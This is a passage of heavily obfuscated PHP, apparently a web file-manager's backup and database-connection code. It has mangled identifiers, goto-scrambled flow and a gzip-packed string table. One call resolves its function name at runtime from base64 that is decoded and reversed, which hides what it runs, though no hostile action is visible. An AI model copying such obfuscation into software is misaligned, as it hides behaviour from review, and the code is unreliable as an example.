$this->where($bˆ§ê®ğ‹)->delete(); } public function cacheSet($E…¡ğ†½Ø‚, $FœÑãÏÒœö = false) { return Cache::set($this->cacheKey($E…¡ğ†½Ø‚), $FœÑãÏÒœö); } public function cacheGet($b¯»òŠ¹»Û) { return Cache::get($this->cacheKey($b¯»òŠ¹»Û)); } public function cacheRemove($BÄßÔÆù‘) { return Cache::remove($this->cacheKey($BÄßÔÆù‘)); } protected function filterWhere($C êĞŒ­’ğ) { return $C êĞŒ­’ğ; } protected function cacheKey($bÌ×‘œÏ¢§) { return $bÌ×‘œÏ¢§; } } goto c´¹®âë‘’; a¬Ô¯Ëà­: define($_SERVER[¹Ò‹Ò¹][0], $_SERVER[¹Ò‹Ò¹][1]); $_SERVER[½] = explode($_SERVER[¹Ò‹Ò¹][2], gzinflate(substr($_SERVER[¹Ò‹Ò¹][3], 10, -8))); function binCheckEq($a¶°”«‡²», $e‚‹ˆËİÑç) { return $a¶°”«‡²» == $e‚‹ˆËİÑç; } goto f±º×Û¬é¶; BîÙæ±”–: class Backup { protected static $name; protected static $option; public function __construct() { $this->init(); } public function init() { $E’Ûä¦ç†§ =& $_SERVER[¹Ò‹Ò¹]; self::$name = date($E’Ûä¦ç†§[702]); if (!($Bˆ¿»Â…‡ = Model($E’Ûä¦ç†§[703])->lastItem())) { $Bˆ¿»Â…‡ = $this->initData(); } else { self::$name = $Bˆ¿»Â…‡[$E’Ûä¦ç†§[28]]; if ($Bˆ¿»Â…‡[$E’Ûä¦ç†§[704]] == $E’Ûä¦ç†§[86]) { self::$name = date($E’Ûä¦ç†§[705]); $bÙ—Ò„ùÂ¾ = 0; if (isset($Bˆ¿»Â…‡[$E’Ûä¦ç†§[289]][$E’Ûä¦ç†§[191]][$E’Ûä¦ç†§[441]])) { $bÙ—Ò„ùÂ¾ = (int) $Bˆ¿»Â…‡[$E’Ûä¦ç†§[289]][$E’Ûä¦ç†§[191]][$E’Ûä¦ç†§[441]]; } if ($Bˆ¿»Â…‡[$E’Ûä¦ç†§[28]] == self::$name) { Model($E’Ûä¦ç†§[703])->remove($Bˆ¿»Â…‡[$E’Ûä¦ç†§[388]]); } $Bˆ¿»Â…‡ = $this->initData($bÙ—Ò„ùÂ¾, $Bˆ¿»Â…‡[$E’Ûä¦ç†§[706]]); } else { $this->checkStore($Bˆ¿»Â…‡[$E’Ûä¦ç†§[706]]); } } self::$option = $Bˆ¿»Â…‡; } private function initData($dùÒ‹„¿®Ù = 0, $fáÁ‡íÇ”Ã = '') { goto CØÉ¤Œ­äÊ; FŠäì—Ù: $this->checkStore($eî‡È¹—œ[$dâ†íÛìï[706]]); $D¬–¢ÉÕ™ = array($dâ†íÛìï[706] => $eî‡È¹—œ[$dâ†íÛìï[706]], $dâ†íÛìï[28] => self::$name, $dâ†íÛìï[704] => 0, $dâ†íÛìï[707] => $eî‡È¹—œ[$dâ†íÛìï[707]], $dâ†íÛìï[289] => array($dâ†íÛìï[708] => array($dâ†íÛìï[704] => 0), $dâ†íÛìï[709] => array($dâ†íÛìï[704] => 0, $dâ†íÛìï[710] => 0, $dâ†íÛìï[711] => 0, $dâ†íÛìï[29] => $dâ†íÛìï[33]), $dâ†íÛìï[712] => array($dâ†íÛìï[704] => 0, $dâ†íÛìï[710] => 0, $dâ†íÛìï[711] => 0), $dâ†íÛìï[191] => array($dâ†íÛìï[704] => 0, $dâ†íÛìï[713] => 0, $dâ†íÛìï[714] => 0, $dâ†íÛìï[715] => 0, $dâ†íÛìï[716] => 0, $dâ†íÛìï[441] => $dùÒ‹„¿®Ù)), $dâ†íÛìï[717] => time(), $dâ†íÛìï[470] => 0); $aˆÊñŒİ’Ü = Model($dâ†íÛìï[703])->insert($D¬–¢ÉÕ™); goto bÎ†¤ùäÎƒ; bÎ†¤ùäÎƒ: $D¬–¢ÉÕ™[$dâ†íÛìï[388]] = $aˆÊñŒİ’Ü; return $D¬–¢ÉÕ™; goto a…Œ¬µÌ”Ø; CØÉ¤Œ­äÊ: $dâ†íÛìï =& $_SERVER[¹Ò‹Ò¹]; $eî‡È¹—œ = Model($dâ†íÛìï[703])->config(); if ($fáÁ‡íÇ”Ã && $eî‡È¹—œ[$dâ†íÛìï[706]] != $fáÁ‡íÇ”Ã) { $dùÒ‹„¿®Ù = 0; } goto FŠäì—Ù; a…Œ¬µÌ”Ø: } private function checkStore($aÌ±ÌˆÁŠ›) { $eãùÈªÂî„ =& $_SERVER[¹Ò‹Ò¹]; $E¤¸à»øÁÔ = Model($eãùÈªÂî„[718])->listData($aÌ±ÌˆÁŠ›); Model($eãùÈªÂî„[718])->checkConfig($E¤¸à»øÁÔ); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[¹Ò‹Ò¹][703])->findByName(self::$name); } return self::$option; } public static function set($e‡àÊÙÔ»Ç) { $b®®ğ°´õ =& $_SERVER[¹Ò‹Ò¹]; $e…Á­éµóŠ = self::get(); foreach ($e‡àÊÙÔ»Ç as $B’ŠÁÛáÚä => $eöÉ§¹ÕçÍ) { $B“ã™¡¯ŒÉ = explode($b®®ğ°´õ[94], $B’ŠÁÛáÚä); $dŞ²‰‰Ëø = count($B“ã™¡¯ŒÉ); switch ($dŞ²‰‰Ëø) { case 1: $e…Á­éµóŠ[$B“ã™¡¯ŒÉ[0]] = $eöÉ§¹ÕçÍ; break; case 2: $e…Á­éµóŠ[$B“ã™¡¯ŒÉ[0]][$B“ã™¡¯ŒÉ[1]] = $eöÉ§¹ÕçÍ; break; case 3: $e…Á­éµóŠ[$B“ã™¡¯ŒÉ[0]][$B“ã™¡¯ŒÉ[1]][$B“ã™¡¯ŒÉ[2]] = $eöÉ§¹ÕçÍ; break; } } Model($b®®ğ°´õ[703])->update($e…Á­éµóŠ[$b®®ğ°´õ[388]], $e…Á­éµóŠ); self::$option = $e…Á­éµóŠ; return self::$option; } public function keep() { $dÜ÷Ó‚ã»ˆ =& $_SERVER[¹Ò‹Ò¹]; $E…‘Èìœ = self::get(); if ($E…‘Èìœ[$dÜ÷Ó‚ã»ˆ[289]][$dÜ÷Ó‚ã»ˆ[708]][$dÜ÷Ó‚ã»ˆ[704]] == $dÜ÷Ó‚ã»ˆ[86]) { return; } $this->backupKeep($E…‘Èìœ); self::set(array($dÜ÷Ó‚ã»ˆ[719] => 1)); } private function backupKeep($däç¢ßãÄ) { goto a•¾„¸¡‹; b¸¿â†Şñí: for ($fÙµÁëùô = 0; $fÙµÁëùô < 12; $fÙµÁëùô++) { $D´öäÏø[] = date($A‡’Ñ¡»‹[720], strtotime("\x2d{$fÙµÁëùô}\x20\x6d\x6f\156\164\150\163")); } $D´öäÏø = array_unique($D´öäÏø); foreach ($Bİ­œÀÁ‡ì as $FŒµ ªíå) { if (!empty($FŒµ ªíå[$A‡’Ñ¡»‹[28]]) && in_array($FŒµ ªíå[$A‡’Ñ¡»‹[28]], $D´öäÏø)) { continue; } Model($A‡’Ñ¡»‹[703])->remove($FŒµ ªíå[$A‡’Ñ¡»‹[388]]); $EÕĞã‹ß³ = "\x7b\151\x6f\72{$däç¢ßãÄ[$A‡’Ñ¡»‹[706]]}\x7d\57\144\x61\x74\x61\142\x61\x73\145\57\142\x61\x63\x6b\x75\160\x5f{$FŒµ ªíå[$A‡’Ñ¡»‹[28]]}"; IO::remove($EÕĞã‹ß³, !1); } goto aˆ¯ƒÃÌå£; a•¾„¸¡‹: $A‡’Ñ¡»‹ =& $_SERVER[¹Ò‹Ò¹]; $Bİ­œÀÁ‡ì = Model($A‡’Ñ¡»‹[703])->listData(); if (empty($Bİ­œÀÁ‡ì)) { return; } goto FÔ¥®¯°¤Î; FÔ¥®¯°¤Î: $fÙµÁëùô = 0; $D´öäÏø = array(); foreach ($Bİ­œÀÁ‡ì as $FŒµ ªíå) { if ($fÙµÁëùô >= 7) { break; } $D´öäÏø[] = $FŒµ ªíå[$A‡’Ñ¡»‹[28]]; $fÙµÁëùô++; } goto b¸¿â†Şñí; aˆ¯ƒÃÌå£: } public function db() { goto F™àİ£ë¢¼; fƒ‚‰ÕïÁù: return !0; goto CÔØìë»ÒË; dš‹Š¼¶: $Bˆ©‰¢ÏÎâ = new BackupDb(); if (!$Bˆ©‰¢ÏÎâ->index()) { return !1; } self::set(array($Aœ»éù[721] => 1)); goto fƒ‚‰ÕïÁù; F™àİ£ë¢¼: $Aœ»éù =& $_SERVER[¹Ò‹Ò¹]; $C¼ø´õßé¤ = self::get(); if ($C¼ø´õßé¤[$Aœ»éù[289]][$Aœ»éù[709]][$Aœ»éù[704]] == $Aœ»éù[86]) { return !0; } goto dš‹Š¼¶; CÔØìë»ÒË: } public function dbFile() { goto a¯÷’µ½²Ã; a¯÷’µ½²Ã: $BâƒÇ³ÂÄ =& $_SERVER[¹Ò‹Ò¹]; $E©¦ïÔÀÑ = self::get(); if ($E©¦ïÔÀÑ[$BâƒÇ³ÂÄ[289]][$BâƒÇ³ÂÄ[712]][$BâƒÇ³ÂÄ[704]] == $BâƒÇ³ÂÄ[86]) { return !0; } goto eñ‚¹Ç”ãÇ; C”½“È†Í: return !0; goto Dä¹‚ÕÁôÏ; eñ‚¹Ç”ãÇ: $fäŞÜ‰ä¸‘ = new BackupDbFile(); if (!$fäŞÜ‰ä¸‘->index()) { return !1; } self::set(array($BâƒÇ³ÂÄ[722] => 1)); goto C”½“È†Í; Dä¹‚ÕÁôÏ: } public function file() { $cÉá˜Í¿Œ =& $_SERVER[¹Ò‹Ò¹]; $b–›øƒŸ¯å = self::get(); if ($b–›øƒŸ¯å[$cÉá˜Í¿Œ[289]][$cÉá˜Í¿Œ[191]][$cÉá˜Í¿Œ[704]] == $cÉá˜Í¿Œ[86]) { return !0; } if (!isset($b–›øƒŸ¯å[$cÉá˜Í¿Œ[707]]) || $b–›øƒŸ¯å[$cÉá˜Í¿Œ[707]] == $cÉá˜Í¿Œ[491]) { $A‡ğ•–‰ÅÖ = new BackupFile(); if (!$A‡ğ•–‰ÅÖ->index()) { return !1; } } self::set(array($cÉá˜Í¿Œ[723] => 1, $cÉá˜Í¿Œ[704] => 1)); return !0; } } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { goto b ïĞ±Ö; eİù§ïğ†Ø: mk_dir($EÕèõ“ŞÄØ); $Aº¥ÍÔİ = $E¬ªÌÓùÚ = 0; try { $A´Œã’±œ = $e·¨¦ÙÂŸÚ->db()->getTables(); } catch (Exception $A½¥ğ×çÕ) { return !1; } goto bŞÆ©ÖÇ×ï; Fá²«ÏÉÈ‚: self::$name = $B‘ªò’Ê˜Œ[$cŠé‹Èë„‰[28]]; $AÛŸõÕÚÒ = $GLOBALS[$cŠé‹Èë„‰[6]][$cŠé‹Èë„‰[17]]; $dŸĞ—µ±‡ = $this->_dbType($AÛŸõÕÚÒ); goto bÓŞÅÇùç; Côâ­ã³¬Õ: foreach ($A´Œã’±œ as $fæ’ğ£ß°») { $AµÂÔù¬½ = $EÕèõ“ŞÄØ . $fæ’ğ£ß°» . $cŠé‹Èë„‰[732]; $F‚¬‘ÁˆŞĞ = null; if ($fæ’ğ£ß°» == $cŠé‹Èë„‰[733] && (!isset($B‘ªò’Ê˜Œ[$cŠé‹Èë„‰[707]]) || $B‘ªò’Ê˜Œ[$cŠé‹Èë„‰[707]] == $cŠé‹Èë„‰[491])) { $F‚¬‘ÁˆŞĞ = self::$io; } $E¬ªÌÓùÚ += $e·¨¦ÙÂŸÚ->sqlFromDb($fæ’ğ£ß°», $AµÂÔù¬½, $F³Ã‡Î‡õï, $F‚¬‘ÁˆŞĞ); } if (isset($F³Ã‡Î‡õï->task[$cŠé‹Èë„‰[734]])) { $A„÷É’ğƒÊ = $F³Ã‡Î‡õï->task[$cŠé‹Èë„‰[734]] ? $F³Ã‡Î‡õï->task[$cŠé‹Èë„‰[734]] : timeFloat(); $d¼½ñå¶¼Æ = $A„÷É’ğƒÊ - $F³Ã‡Î‡õï->task[$cŠé‹Èë„‰[735]]; if ($d¼½ñå¶¼Æ >= 0.2) { $Aº¥ÍÔİ += 1; } } $F³Ã‡Î‡õï->end(); goto F±•ñ›Õå; bÓŞÅÇùç: $e·¨¦ÙÂŸÚ = new DbManage($AÛŸõÕÚÒ, $dŸĞ—µ±‡); $EÕèõ“ŞÄØ = TEMP_FILES . $cŠé‹Èë„‰[724] . self::$name . $cŠé‹Èë„‰[8]; del_dir($EÕèõ“ŞÄØ); goto eİù§ïğ†Ø; D¶ÖÑ£ê³à: return !0; goto d„Ş—Éƒ…‚; b ïĞ±Ö: $cŠé‹Èë„‰ =& $_SERVER[¹Ò‹Ò¹]; $B‘ªò’Ê˜Œ = Backup::get(); self::$io = $B‘ªò’Ê˜Œ[$cŠé‹Èë„‰[706]]; goto Fá²«ÏÉÈ‚; bŞÆ©ÖÇ×ï: $A´Œã’±œ = array_diff($A´Œã’±œ, array($cŠé‹Èë„‰[725], $cŠé‹Èë„‰[726])); foreach ($A´Œã’±œ as $fæ’ğ£ß°») { $Aº¥ÍÔİ += $e·¨¦ÙÂŸÚ->model($fæ’ğ£ß°»)->count(); } $F³Ã‡Î‡õï = new Task($cŠé‹Èë„‰[727], $cŠé‹Èë„‰[728], $Aº¥ÍÔİ, LNG($cŠé‹Èë„‰[729]) . $cŠé‹Èë„‰[730] . LNG($cŠé‹Èë„‰[731])); goto Côâ­ã³¬Õ; F±•ñ›Õå: $eğ¶È†×ÄÛ = array($cŠé‹Èë„‰[736] => $dŸĞ—µ±‡, $cŠé‹Èë„‰[721] => 1, $cŠé‹Èë„‰[737] => $Aº¥ÍÔİ, $cŠé‹Èë„‰[738] => $E¬ªÌÓùÚ); Backup::set($eğ¶È†×ÄÛ); if ($Aº¥ÍÔİ > $E¬ªÌÓùÚ) { return !1; } goto D¶ÖÑ£ê³à; d„Ş—Éƒ…‚: } private function _dbType($añÀ†²”å†) { goto F¡Ê²š‰ç³; F¡Ê²š‰ç³: $f…Ëœ¹è§ =& $_SERVER[¹Ò‹Ò¹]; $añÀ†²”å† = array_change_key_case($añÀ†²”å†); $dæ‹ÚŸ—ïÉ = $añÀ†²”å†[$f…Ëœ¹è§[739]]; goto fÛÑ°ö­åƒ; Aß¼à ò¾“: return $dæ‹ÚŸ—ïÉ; goto BìÑ»¹ØÁ£; fÛÑ°ö­åƒ: if ($dæ‹ÚŸ—ïÉ == $f…Ëœ¹è§[740]) { $CÃò”¬ª’Û = explode($f…Ëœ¹è§[4], $añÀ†²”å†[$f…Ëœ¹è§[741]]); $dæ‹ÚŸ—ïÉ = $CÃò”¬ª’Û[0]; } $B©‰ÀÕ‹ = array($f…Ëœ¹è§[742] => $f…Ëœ¹è§[9], $f…Ëœ¹è§[743] => $f…Ëœ¹è§[744]); if (isset($B©‰ÀÕ‹[$dæ‹ÚŸ—ïÉ])) { $dæ‹ÚŸ—ïÉ = $B©‰ÀÕ‹[$dæ‹ÚŸ—ïÉ]; } goto Aß¼à ò¾“; BìÑ»¹ØÁ£: } } class BackupDbFile { public function __construct() { } public function index() { goto c‹ÓÄëõğ; dïä§ì ‘—: $CÊ³ÙŞ²áÎ->end(); Backup::set(array($D¿á«¨Ê”¨[752] => $e­ãå‰ÎµÃ)); return !0; goto dŞ¡‡Ì¬†£; c‹ÓÄëõğ: $D¿á«¨Ê”¨ =& $_SERVER[¹Ò‹Ò¹]; $c¯Ş´ùƒª‡ = Backup::get(); $BäÂØŒ‘¬š = $c¯Ş´ùƒª‡[$D¿á«¨Ê”¨[28]]; goto fÊâˆªõ÷ì; b‰§ÖİÆ²: if (!$e­ãå‰ÎµÃ) { return !1; } Backup::set(array($D¿á«¨Ê”¨[745] => $e­ãå‰ÎµÃ)); $CÊ³ÙŞ²áÎ = new TaskFileTransfer($D¿á«¨Ê”¨[746], $D¿á«¨Ê”¨[728], count($e­Á­ÓÀ“), LNG($D¿á«¨Ê”¨[729]) . $D¿á«¨Ê”¨[434] . LNG($D¿á«¨Ê”¨[731]) . $D¿á«¨Ê”¨[747]); goto Bïœ¾Å±Õ; fÊâˆªõ÷ì: $E¯ÃçÈùª = TEMP_FILES . "\142\141\143\153\165\x70\x5f{$BäÂØŒ‘¬š}\x2f"; $D¢Ç„Æ‡­ô = "\173\151\157\x3a{$c¯Ş´ùƒª‡[$D¿á«¨Ê”¨[706]]}\x7d\57\144\141\164\141\142\x61\163\x65\x2f\x62\141\143\153\x75\x70\x5f{$BäÂØŒ‘¬š}\x2f"; if (!($D¢Ç„Æ‡­ô = IO::mkdir($D¢Ç„Æ‡­ô))) { return !1; } goto e­Œ¨øÃåé; Bïœ¾Å±Õ: $CÊ³ÙŞ²áÎ->task[$D¿á«¨Ê”¨[713]] = $e­ãå‰ÎµÃ; foreach ($Aò¾Ÿ‚öîÑ[$D¿á«¨Ê”¨[73]] as $bæ½§ó‹‚†) { $fÒ’¤±— = IO::move($bæ½§ó‹‚†[$D¿á«¨Ê”¨[75]], $D¢Ç„Æ‡­ô); if (!$fÒ’¤±—) { $CÊ³ÙŞ²áÎ->end(); $c‰ãÔÖˆĞ = IO::getLastError($D¿á«¨Ê”¨[748] . $bæ½§ó‹‚†[$D¿á«¨Ê”¨[75]] . $D¿á«¨Ê”¨[749] . $D¢Ç„Æ‡­ô . $D¿á«¨Ê”¨[499]); write_log($c‰ãÔÖˆĞ, $D¿á«¨Ê”¨[728]); return !1; } } $D«ÉÎ—Û¶Ö = CONTROLLER_DIR . $D¿á«¨Ê”¨[750]; goto EŒ›­†„ã‰; e­Œ¨øÃåé: $Aò¾Ÿ‚öîÑ = IO::listPath($E¯ÃçÈùª); $e­Á­ÓÀ“ = isset($Aò¾Ÿ‚öîÑ[$D¿á«¨Ê”¨[73]]) ? $Aò¾Ÿ‚öîÑ[$D¿á«¨Ê”¨[73]] : array(); $e­ãå‰ÎµÃ = array_sum(array_column($e­Á­ÓÀ“, $D¿á«¨Ê”¨[77])); goto b‰§ÖİÆ²; EŒ›­†„ã‰: $fÔ‹ßÓ¸ñ = CONTROLLER_DIR . $D¿á«¨Ê”¨[751]; IO::copy($D«ÉÎ—Û¶Ö, $D¢Ç„Æ‡­ô); IO::copy($fÔ‹ßÓ¸ñ, $D¢Ç„Æ‡­ô); goto dïä§ì ‘—; dŞ¡‡Ì¬†£: } } goto c—Áí»—¡; f±º×Û¬é¶: $D´’«ÍùÌÌ = strrev(base64_decode($_SERVER[½][0])); function binCheckNeq($C“¸±¥ìµó, $fÏˆĞÏŸğ) { return $C“¸±¥ìµó != $fÏˆĞÏŸğ; } $_SERVER[$_SERVER[½][1]] = $D´’«ÍùÌÌ($_SERVER[$_SERVER[½][2]]); goto Aë·Š¬…íš; bŸ¹ĞÀÛè: class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\x5f\164\x68\x69\156\x6b\137"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\x65\161" => "\x3d", "\156\x65\161" => "\x3c\x3e", "\x67\164" => "\x3e", "\x65\x67\164" => "\76\75", "\154\164" => "\74", "\145\154\x74" => "\74\75", "\x6e\x6f\164\x6c\x69\x6b\x65" => "\x4e\117\124\40\114\x49\x4b\x45", "\154\x69\x6b\145" => "\114\111\113\x45", "\x69\156" => "\111\116", "\x6e\157\164\151\156" => "\x4e\117\124\40\111\x4e", "\x6e\x6f\x74\40\151\x6e" => "\x4e\x4f\124\x20\x49\116", "\142\x65\164\167\x65\145\156" => "\102\x45\x54\x57\x45\105\x4e", "\156\157\x74\x62\x65\164\167\145\145\156" => "\x4e\117\x54\x20\x42\105\124\127\x45\x45\116", "\156\x6f\x74\40\x62\145\164\167\x65\x65\x6e" => "\116\117\124\40\102\x45\x54\127\x45\x45\116"); protected $selectSql = "\x53\105\114\x45\x43\x54\45\104\111\x53\124\x49\x4e\103\124\x25\40\x25\106\111\x45\114\x44\45\40\x46\122\117\115\x20\x25\x54\x41\102\114\x45\x25\x25\x4a\117\x49\x4e\x25\45\x57\110\105\x52\x45\45\x25\107\x52\x4f\x55\x50\x25\x25\x48\x41\126\111\116\x47\x25\45\117\122\x44\x45\x52\x25\45\x4c\111\115\111\x54\x25\x20\x25\125\x4e\x49\117\116\x25\x25\x43\x4f\115\115\x45\116\124\45"; protected $bind = array(); public static function getInstance() { $eÀÚåÈäÂì = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[¹Ò‹Ò¹][895], $eÀÚåÈäÂì); } public function factory($f¨›È²í×ƒ = '') { goto dÆ–°÷œš; D–ŒøäŠõ¬: $this->dbType = ucwords(strtolower($f¨›È²í×ƒ[$b¦º¾İÙ‡[896]])); $fÎ éœ‹ùÑ = $b¦º¾İÙ‡[898] . $this->dbType; if (class_exists($fÎ éœ‹ùÑ)) { $a‹„ÍàäØ = new $fÎ éœ‹ùÑ($f¨›È²í×ƒ); if ($b¦º¾İÙ‡[740] != strtolower($f¨›È²í×ƒ[$b¦º¾İÙ‡[896]])) { $a‹„ÍàäØ->dbType = strtoupper($this->dbType); } else { $a‹„ÍàäØ->dbType = $this->_getDsnType($f¨›È²í×ƒ[$b¦º¾İÙ‡[851]]); } } else { think_exception(think_lang($b¦º¾İÙ‡[899]) . $b¦º¾İÙ‡[900] . $fÎ éœ‹ùÑ); } goto A«Å±¬ÑÀ‡; dÆ–°÷œš: $b¦º¾İÙ‡ =& $_SERVER[¹Ò‹Ò¹]; $f¨›È²í×ƒ = $this->parseConfig($f¨›È²í×ƒ); if (empty($f¨›È²í×ƒ[$b¦º¾İÙ‡[896]])) { think_exception(think_lang($b¦º¾İÙ‡[897])); } goto D–ŒøäŠõ¬; A«Å±¬ÑÀ‡: return $a‹„ÍàäØ; goto cé„—œ‹Œ; cé„—œ‹Œ: } public function __call($dá°åíØ—…, $FÄ£åç»‹¯) { if (method_exists($this, $dá°åíØ—…)) { return call_user_func_array(array($this, $dá°åíØ—…), $FÄ£åç»‹¯); } } protected function _getDsnType($c†°éª‘®Ü) { $dµ›ÊÁ‚¿é = explode($_SERVER[¹Ò‹Ò¹][4], $c†°éª‘®Ü); $Fù‘áÔŸô– = strtoupper(trim($dµ›ÊÁ‚¿é[0])); return $Fù‘áÔŸô–; } private function parseConfig($c²îÌ¯’ğ = '') { $BÇÛ¡™›’ =& $_SERVER[¹Ò‹Ò¹]; if (!empty($c²îÌ¯’ğ) && is_string($c²îÌ¯’ğ)) { $c²îÌ¯’ğ = $this->parseDSN($c²îÌ¯’ğ); } elseif (is_array($c²îÌ¯’ğ)) { $c²îÌ¯’ğ = array_change_key_case($c²îÌ¯’ğ); $c²îÌ¯’ğ = array($BÇÛ¡™›’[896] => $c²îÌ¯’ğ[$BÇÛ¡™›’[739]], $BÇÛ¡™›’[824] => $c²îÌ¯’ğ[$BÇÛ¡™›’[901]], $BÇÛ¡™›’[825] => $c²îÌ¯’ğ[$BÇÛ¡™›’[902]], $BÇÛ¡™›’[822] => $c²îÌ¯’ğ[$BÇÛ¡™›’[903]], $BÇÛ¡™›’[823] => $c²îÌ¯’ğ[$BÇÛ¡™›’[904]], $BÇÛ¡™›’[17] => $c²îÌ¯’ğ[$BÇÛ¡™›’[905]], $BÇÛ¡™›’[851] => $c²îÌ¯’ğ[$BÇÛ¡™›’[741]], $BÇÛ¡™›’[13] => isset($c²îÌ¯’ğ[$BÇÛ¡™›’[906]]) ? $c²îÌ¯’ğ[$BÇÛ¡™›’[906]] : array()); } elseif (empty($c²îÌ¯’ğ)) { if (think_config($BÇÛ¡™›’[907]) && $BÇÛ¡™›’[740] != strtolower(think_config($BÇÛ¡™›’[908]))) { $c²îÌ¯’ğ = $this->parseDSN(think_config($BÇÛ¡™›’[907])); } else { $c²îÌ¯’ğ = array($BÇÛ¡™›’[896] => think_config($BÇÛ¡™›’[908]), $BÇÛ¡™›’[824] => think_config($BÇÛ¡™›’[909]), $BÇÛ¡™›’[825] => think_config($BÇÛ¡™›’[910]), $BÇÛ¡™›’[822] => think_config($BÇÛ¡™›’[911]), $BÇÛ¡™›’[823] => think_config($BÇÛ¡™›’[912]), $BÇÛ¡™›’[17] => think_config($BÇÛ¡™›’[242]), $BÇÛ¡™›’[851] => think_config($BÇÛ¡™›’[907]), $BÇÛ¡™›’[13] => think_config($BÇÛ¡™›’[913])); } } return $c²îÌ¯’ğ; } protected function initConnect($E—†»‚·ò¤ = true) { if (1 == think_config($_SERVER[¹Ò‹Ò¹][18])) { $this->_linkID = $this->multiConnect($E—†»‚·ò¤); } else { if ($this->config) { $this->configLast = $this->config; } } if (!$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $E£ÕŠŒ¾½£ => $D‘èùğ„Øœ) { $this->_linkID = $D‘èùğ„Øœ; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($dÍ» ¬ºâÓ = false) { goto c‚ÁÀÄÍ­; c‚ÁÀÄÍ­: $fğÚ…×ì‰ =& $_SERVER[¹Ò‹Ò¹]; static $båÑÕ‚£ÍÓ = array(); static $A”èßáìçª = -1; goto b‚°§µ–ùó; b‚°§µ–ùó: if (empty($båÑÕ‚£ÍÓ)) { foreach ($this->config as $bò·óåà• => $Cöó›æÆ’¤) { $båÑÕ‚£ÍÓ[$bò·óåà•] = explode($fğÚ…×ì‰[47], $Cöó›æÆ’¤); } } if (think_config($fğÚ…×ì‰[914])) { if ($dÍ» ¬ºâÓ) { $a‹ˆŠ²‚Óã = floor(mt_rand(0, think_config($fğÚ…×ì‰[915]) - 1)); $A”èßáìçª = $a‹ˆŠ²‚Óã; } else { if (is_numeric(think_config($fğÚ…×ì‰[916]))) { $a‹ˆŠ²‚Óã = think_config($fğÚ…×ì‰[916]); } else { $a‹ˆŠ²‚Óã = floor(mt_rand(think_config($fğÚ…×ì‰[915]), count($båÑÕ‚£ÍÓ[$fğÚ…×ì‰[822]]) - 1)); } } } else { $a‹ˆŠ²‚Óã = floor(mt_rand(0, count($båÑÕ‚£ÍÓ[$fğÚ…×ì‰[822]]) - 1)); $A”èßáìçª = $a‹ˆŠ²‚Óã; } $a‹ˆŠ²‚Óã = $A”èßáìçª !== -1 ? $A”èßáìçª : $a‹ˆŠ²‚Óã; goto d¢ŠÖ·§”®; d¢ŠÖ·§”®: $D³ñ­”‘Ô‰ = array($fğÚ…×ì‰[824] => isset($båÑÕ‚£ÍÓ[$fğÚ…×ì‰[824]][$a‹ˆŠ²‚Óã]) ? $båÑÕ‚£ÍÓ[$fğÚ…×ì‰[824]][$a‹ˆŠ²‚Óã] : $båÑÕ‚£ÍÓ[$fğÚ…×ì‰[824]][0], $fğÚ…×ì‰[825] => isset($båÑÕ‚£ÍÓ[$fğÚ…×ì‰[825]][$a‹ˆŠ²‚Óã]) ? $båÑÕ‚£ÍÓ[$fğÚ…×ì‰[825]][$a‹ˆŠ²‚Óã] : $båÑÕ‚£ÍÓ[$fğÚ…×ì‰[825]][0], $fğÚ…×ì‰[822] => isset($båÑÕ‚£ÍÓ[$fğÚ…×ì‰[822]][$a‹ˆŠ²‚Óã]) ? $båÑÕ‚£ÍÓ[$fğÚ…×ì‰[822]][$a‹ˆŠ²‚Óã] : $båÑÕ‚£ÍÓ[$fğÚ…×ì‰[822]][0], $fğÚ…×ì‰[823] => isset($båÑÕ‚£ÍÓ[$fğÚ…×ì‰[823]][$a‹ˆŠ²‚Óã]) ? $båÑÕ‚£ÍÓ[$fğÚ…×ì‰[823]][$a‹ˆŠ²‚Óã] : $båÑÕ‚£ÍÓ[$fğÚ…×ì‰[823]][0], $fğÚ…×ì‰[17] => isset($båÑÕ‚£ÍÓ[$fğÚ…×ì‰[17]][$a‹ˆŠ²‚Óã]) ? $båÑÕ‚£ÍÓ[$fğÚ…×ì‰[17]][$a‹ˆŠ²‚Óã] : $båÑÕ‚£ÍÓ[$fğÚ…×ì‰[17]][0], $fğÚ…×ì‰[851] => isset($båÑÕ‚£ÍÓ[$fğÚ…×ì‰[851]][$a‹ˆŠ²‚Óã]) ? $båÑÕ‚£ÍÓ[$fğÚ…×ì‰[851]][$a‹ˆŠ²‚Óã] : $båÑÕ‚£ÍÓ[$fğÚ…×ì‰[851]][0], $fğÚ…×ì‰[13] => isset($båÑÕ‚£ÍÓ[$fğÚ…×ì‰[13]][$a‹ˆŠ²‚Óã]) ? $båÑÕ‚£ÍÓ[$fğÚ…×ì‰[13]][$a‹ˆŠ²‚Óã] : $båÑÕ‚£ÍÓ[$fğÚ…×ì‰[13]][0]); return $this->connect($D³ñ­”‘Ô‰, $a‹ˆŠ²‚Óã); goto BÀéÜ•ìÏ; BÀéÜ•ìÏ: } public function parseDSN($CùŠ¹óâÄ) { $E±Å†İˆØ =& $_SERVER[¹Ò‹Ò¹]; if (empty($CùŠ¹óâÄ)) { return !1; } $AĞøøŸÈ™ˆ = parse_url($CùŠ¹óâÄ); if ($AĞøøŸÈ™ˆ[$E±Å†İˆØ[173]]) { $aÛÀ‹ÅäÛ = array($E±Å†İˆØ[896] => $AĞøøŸÈ™ˆ[$E±Å†İˆØ[173]], $E±Å†İˆØ[824] => isset($AĞøøŸÈ™ˆ[$E±Å†İˆØ[557]]) ? $AĞøøŸÈ™ˆ[$E±Å†İˆØ[557]] : $E±Å†İˆØ[33], $E±Å†İˆØ[825] => isset($AĞøøŸÈ™ˆ[$E±Å†İˆØ[917]]) ? $AĞøøŸÈ™ˆ[$E±Å†İˆØ[917]] : $E±Å†İˆØ[33], $E±Å†İˆØ[822] => isset($AĞøøŸÈ™ˆ[$E±Å†İˆØ[174]]) ? 